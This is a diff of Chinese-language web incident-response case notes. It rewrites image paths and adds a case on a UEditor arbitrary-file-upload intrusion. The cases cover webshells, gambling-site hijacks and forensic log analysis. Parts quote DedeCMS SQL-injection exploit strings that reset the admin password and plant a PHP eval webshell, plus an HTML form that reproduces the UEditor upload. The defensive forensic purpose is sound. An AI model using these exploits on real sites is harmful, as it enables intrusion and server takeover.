@@ -1,4 +1,4 @@
-## 第1篇：网站被植入Webshell
+第1篇：网站被植入Webshell
 
 网站被植入webshell，意味着网站存在可利用的高危漏洞，攻击者通过利用漏洞入侵网站，写入webshell接管网站的控制权。为了得到权限 ，常规的手段如：前后台任意文件上传，远程命令执行，Sql注入写入文件等。
 
@@ -6,7 +6,7 @@
 
 网站管理员在站点目录下发现存在webshell，于是开始了对入侵过程展开了分析。
 
-![img](https://bypass007.github.io/Emergency-Response-Notes/Web/image/1-1.png)
+![img](Web实战/images/1-1.png)
 
 Webshell查杀工具：
 
@@ -22,7 +22,7 @@ D盾_Web查杀 Window下webshell查杀：http://www.d99net.net/index.asp
 
 通过发现的webshell文件创建时间点，去翻看相关日期的访问日志。
 
-![img](https://bypass007.github.io/Emergency-Response-Notes/Web/image/1-2.png)
+![img](Web实战/images/1-2.png)
 
 #### 2、Web 日志分析
 
@@ -34,15 +34,15 @@ D盾_Web查杀 Window下webshell查杀：http://www.d99net.net/index.asp
 
 访问webservice接口，发现变量：buffer、distinctpach、newfilename可以在客户端自定义
 
-![img](https://bypass007.github.io/Emergency-Response-Notes/Web/image/1-4.png)
+![img](Web实战/images/1-4.png)
 
 #### 4、漏洞复现
 
 尝试对漏洞进行复现，可成功上传webshell，控制网站服务器
 
-![img](https://bypass007.github.io/Emergency-Response-Notes/Web/image/1-5.png)
+![img](Web实战/images/1-5.png)
 
-![img](https://bypass007.github.io/Emergency-Response-Notes/Web/image/1-6.png)
+![img](Web实战/images/1-6.png)
 
 #### 5、漏洞修复
 
@@ -60,7 +60,7 @@ D盾_Web查杀 Window下webshell查杀：http://www.d99net.net/index.asp
 
 从08/09日0点开始，局域网内某IP访问网站页面会触发安全预警，只要访问此服务器上的网页，CPU直线上升100%
 
-![img](https://bypass007.github.io/Emergency-Response-Notes/Web/image/2-5.jpg)
+![img](Web实战/images/2-5.jpg)
 
 ### 问题解析
 
@@ -94,23 +94,23 @@ D盾_Web查杀 Window下webshell查杀：http://www.d99net.net/index.asp
 
 访问这些链接，跳转到如图页面：
 
-![img](https://bypass007.github.io/Emergency-Response-Notes/Web/image/3-1.png)
+![img](Web实战/images/3-1.png)
 
 ### 问题处理：
 
 1、打开电脑文件夹选项卡，取消”隐藏受保护的操作系统文件“勾选，把”隐藏文件和文件夹“下面的单选选择“显示隐藏的文件、文件夹和驱动器”。
 
-![img](https://bypass007.github.io/Emergency-Response-Notes/Web/image/3-2.png)
+![img](Web实战/images/3-2.png)
 
 2、再次查看，可以看到半透明的文件夹，清楚隐藏文件夹及所有页面
 
-![img](https://bypass007.github.io/Emergency-Response-Notes/Web/image/3-3.png)
+![img](Web实战/images/3-3.png)
 
 3、然后清除IIS临时压缩文件
 
 C:\inetpub\temp\IIS Temporary Compressed Files\WEBUI$^_gzip_D^\WEB\WEBUI\UPLOAD
 
-![img](https://bypass007.github.io/Emergency-Response-Notes/Web/image/3-4.png)
+![img](Web实战/images/3-4.png)
 
 4、投诉快照，申请删除相关的网页收录，减少对网站的影响。
 
@@ -122,7 +122,7 @@ C:\inetpub\temp\IIS Temporary Compressed Files\WEBUI$^_gzip_D^\WEB\WEBUI\UPLOAD
 
 某新闻源网站首页广告链接被劫持到菠菜网站
 
-![img](https://bypass007.github.io/Emergency-Response-Notes/Web/image/4-1.png)
+![img](Web实战/images/4-1.png)
 
 有三个广告专题，链接形式如下：
 
@@ -134,11 +134,11 @@ C:\inetpub\temp\IIS Temporary Compressed Files\WEBUI$^_gzip_D^\WEB\WEBUI\UPLOAD
 
 点击这三条链接会跳转到博彩网站。简单抓包分析一下过程：
 
-![img](https://bypass007.github.io/Emergency-Response-Notes/Web/image/4-2.png)
+![img](Web实战/images/4-2.png)
 
 可以发现此时这个返回页面已被劫持，并且加载了第三方js文件，http://xn--dpqw2zokj.com/N/js/dt.js，进一步访问该文件：
 
-![img](https://bypass007.github.io/Emergency-Response-Notes/Web/image/4-3.png)
+![img](Web实战/images/4-3.png)
 
 dt.js进一步加载了另一条js，访问http://xn--dpqw2zokj.com/N/js/yz.js
 
@@ -146,7 +146,7 @@ dt.js进一步加载了另一条js，访问http://xn--dpqw2zokj.com/N/js/yz.js
 
 我们发现链接跳转到https://lemcoo.com/?dt，进一步访问这个链接，网站为博彩链接导航网站，访问后会随机跳转到第三方赌博网站。
 
-![img](https://bypass007.github.io/Emergency-Response-Notes/Web/image/4-5.png)
+![img](Web实战/images/4-5.png)
 
 ### 问题处理：
 
@@ -154,7 +154,7 @@ dt.js进一步加载了另一条js，访问http://xn--dpqw2zokj.com/N/js/yz.js
 
 对Nginx配置文件进行排查，发现Nginx配置文件VirtualHost.conf被篡改，通过反向代理匹配以“sc”后缀的专题链接，劫持到[http://103.233.248.163](http://103.233.248.163/)，该网站为博彩链接导航网站。
 
-![img](https://bypass007.github.io/Emergency-Response-Notes/Web/image/4-6.png)
+![img](Web实战/images/4-6.png)
 
 删除恶意代理后，专题链接访问恢复。
 
@@ -170,13 +170,13 @@ PC端访问正常，移动端访问出现异常，比如插入弹窗、嵌入式
 
 访问网站首页，抓取到了一条恶意js： http://js.zadovosnjppnywuz.com/caonima.js
 
-![img](https://bypass007.github.io/Emergency-Response-Notes/Web/image/5-1.png)
+![img](Web实战/images/5-1.png)
 
 我们可以发现，攻击者通过这段js代码判断手机访问来源，劫持移动端（如手机、ipad、Android等）流量，跳转到[https://262706.com。](https://262706.com./)
 
 进一步访问[https://262706.com，跳转到赌博网站：](https://262706.xn--com%2C:-bp6hq3ed78kfoish9aprbjyh/)
 
-![img](https://bypass007.github.io/Emergency-Response-Notes/Web/image/5-2.png)
+![img](Web实战/images/5-2.png)
 
 ## 第6篇：搜索引擎劫持
 
@@ -190,15 +190,15 @@ PC端访问正常，移动端访问出现异常，比如插入弹窗、嵌入式
 
 通过对index.php文件进行代码分析，发现该文件代码 对来自搜狗和好搜的访问进行流量劫持。
 
-![img](https://bypass007.github.io/Emergency-Response-Notes/Web/image/6-1.png)
+![img](Web实战/images/6-1.png)
 
 进一步跟着include函数包含的文件，index,php包含/tmp/.ICE-unix/.. /c.jpg。
 
-![img](https://bypass007.github.io/Emergency-Response-Notes/Web/image/6-2.png)
+![img](Web实战/images/6-2.png)
 
 进入/tmp目录进行查看，发现该目录下，如c.jpg等文件，包含着一套博彩劫持的程序。
 
-![img](https://bypass007.github.io/Emergency-Response-Notes/Web/image/6-3.png)
+![img](Web实战/images/6-3.png)
 
 ## 第7篇：网站首页被篡改
 
@@ -214,17 +214,17 @@ PC端访问正常，移动端访问出现异常，比如插入弹窗、嵌入式
 
 通过对被篡改的图片进行查看，确认图片篡改时间为2018年04月18日 19:24:07 。
 
-![img](https://bypass007.github.io/Emergency-Response-Notes/Web/image/7-1.jpg)
+![img](Web实战/images/7-1.jpg)
 
 **2、访问日志溯源**
 
 通过图片修改的时间节点，发现可疑IP：113.xx.xx.24 （代理IP，无法追溯真实来源），访问image.jsp（脚本木马），并随后访问了被篡改的图片地址。
 
-![img](https://bypass007.github.io/Emergency-Response-Notes/Web/image/7-2.png)
+![img](Web实战/images/7-2.png)
 
 进一步审查所有的日志文件(日志保存时间从2017-04-20至2018-04-19)，发现一共只有两次访问image.jsp文件的记录，分别是2018-04-18和2017-09-21。
 
-![img](https://bypass007.github.io/Emergency-Response-Notes/Web/image/7-3.png)
+![img](Web实战/images/7-3.png)
 
 image.jsp在2017-09-21之前就已经上传到网站服务器，已经潜藏长达半年多甚至更久的时间。
 
@@ -232,11 +232,11 @@ image.jsp在2017-09-21之前就已经上传到网站服务器，已经潜藏长�
 
 我们在网站根目录找到了答案，发现站点目录下存在ROOT.rar全站源码备份文件，备份时间为2017-02-28 10:35。
 
-![img](https://bypass007.github.io/Emergency-Response-Notes/Web/image/7-4.png)
+![img](Web实战/images/7-4.png)
 
 通过对ROOT.rar解压缩，发现源码中存在的脚本木马与网站访问日志的可疑文件名一致（image.jsp）。
 
-![img](https://bypass007.github.io/Emergency-Response-Notes/Web/image/7-5.png)
+![img](Web实战/images/7-5.png)
 
 根据这几个时间节点，我们尝试去还原攻击者的攻击路径。
 
@@ -262,19 +262,19 @@ image.jsp在2017-09-21之前就已经上传到网站服务器，已经潜藏长�
 
 在针对网站根目录进行webshell扫描，发现存在脚本木马，创建时间为2018-06-13 04:30:30
 
-![img](https://bypass007.github.io/Emergency-Response-Notes/Web/image/8-1.png)
+![img](Web实战/images/8-1.png)
 
 **2、 定位IP**
 
 通过木马创建时间， 查看网站访问日志，定位到IP为：180.xx.xx.3
 
-![img](https://bypass007.github.io/Emergency-Response-Notes/Web/image/8-2.png)
+![img](Web实战/images/8-2.png)
 
 **3、关联分析**
 
 全局搜索与该IP有关的操作日志：
 
-![img](https://bypass007.github.io/Emergency-Response-Notes/Web/image/8-3.png)
+![img](Web实战/images/8-3.png)
 
 在脚本木马生成前，有两条比较可疑的访问日志吸引了我们的注意：
 
@@ -285,7 +285,7 @@ image.jsp在2017-09-21之前就已经上传到网站服务器，已经潜藏长�
 
 对这段POC进行解码，我们发现通过这个poc可以往数据库中插入数据，进一步访问/plus/ad_js.php?aid=19 即可在plus目录生成read.php脚本文件。
 
-![img](https://bypass007.github.io/Emergency-Response-Notes/Web/image/8-4.png)
+![img](Web实战/images/8-4.png)
 
 解码后：
 
@@ -315,7 +315,7 @@ cfg_dbprefixadmin SETuserid='spider',pwd`='f297a57a5a743894a0e4' where id=19 #
 
 执行EXP后，相应后台数据库表变为如下：
 
-![img](https://bypass007.github.io/Emergency-Response-Notes/Web/image/8-5.png)
+![img](Web实战/images/8-5.png)
 
 （4）因此相应后台登录用户变为spider密码admin
 
@@ -333,7 +333,7 @@ cfg_dbprefixadmin SETuserid='spider',pwd`='f297a57a5a743894a0e4' where id=19 #
 
 （3）执行EXP后，将向数据库表dede_mytag中插入一条记录，
 
-![img](https://bypass007.github.io/Emergency-Response-Notes/Web/image/8-6.png)
+![img](Web实战/images/8-6.png)
 
 （4）执行如下语句，在/plus目录下生成90sec.php一句话木马 http://www.xxxx.com/plus/mytag_js.php?aid=9013
 
@@ -366,3 +366,88 @@ cfg_dbprefixmyadSETnormbody= '<?php file_put_contents(''read.php'',''<?php eval(
 如何防御？
 
 网站采用开源CMS搭建，建议及时对官方发布的系统补丁以及内核版本进行升级。
+
+## 第9篇：编辑器入侵事件
+
+UEditor是百度的一个javascript编辑器的开源项目，很多开发人员都喜欢引用这个编辑器，但这个编辑器官网版本一直停留在2016-05-26，已经很久没有更新了。
+
+### 0x01 现象描述
+
+HIDS预警：发现后门(Webshell)文件，建议您立即进行处理。
+
+### 0x02 事件分析
+
+**1、发现Webshell**
+
+通过预警信息，找到木马文件路径：
+
+![](Web实战/images/9-1.png)
+
+
+
+备注：紧急处理，通过禁止动态脚本在上传目录的运行权限，使webshell无法成功执行。
+
+**2、定位文件上传时间**
+
+根据Webshell文件创建时间，2020年3月9日 15:08:34 
+
+![](Web实战/images/9-2.png)
+
+3、**Web访问日志关联分析**
+
+由于，IIS日志时间与系统时间相差8小时，系统时间是15:08，我们这里查看的是 7:08的日志时间。  
+
+~~~
+2020-03-09 07:08:34 10.215.2.128 POST /ueditor/net/controller.ashx action=catchimage
+...................
+...................
+2020-03-09 07:08:35 10.215.2.128 POST /ueditor/net/controller.ashx action=catchimage
+~~~
+
+找到对应的网站访问日志，在文件创建时间隔间里，我们会注意到这样两个ueditor的访问请求，初步怀疑是UEditor编辑器任意文件上传漏洞。
+
+**4、本地漏洞复现**
+
+A、本地构建一个html
+
+~~~
+<form action="http://xxxxxxxxx/ueditor/net/controller.ashx?action=catchimage"enctype="application/x-www-form-urlencoded"  method="POST">
+  <p>shell addr:<input type="text" name="source[]" /></p >
+  <inputtype="submit" value="Submit" />
+</form>
+~~~
+
+B、上传webshell，上传成功
+
+![](Web实战/images/9-3.png)
+
+经漏洞复现，确认UEditor编辑器任意文件上传漏洞。
+
+**5、还原攻击者行为**
+
+
+通过相关文件的访问记录进行关联分析，攻击者通过 ueditor编辑器成功上传webshell。
+
+### 0x03 事件处理
+
+1、**删除Webshell**
+
+清楚已发现的webshell，并尝试查找可能隐藏的webshell。
+
+**2、代码完整性验证**
+
+我们来思考一个问题，如果有一个免杀的Webshell隐藏在数以万行的代码中，怎么搞？
+
+文件完整性校验，检查网站的源码是否被篡改过。
+
+操作过程：
+
+通过查看服务器上已部署的源代码版本，找研发同事要同样版本的代码。把纯净源码的所有文件计算一次hash值保存，再到服务器上执行一次hash值，通过比对hash值，输出新创建的/被修改过的/删除的文件列表。
+
+**3、系统入侵排查**
+
+对系统做一个整体排查，确认是否存在后门
+
+**4、代码修复**
+
+反馈给相关开发人员进行代码修复。
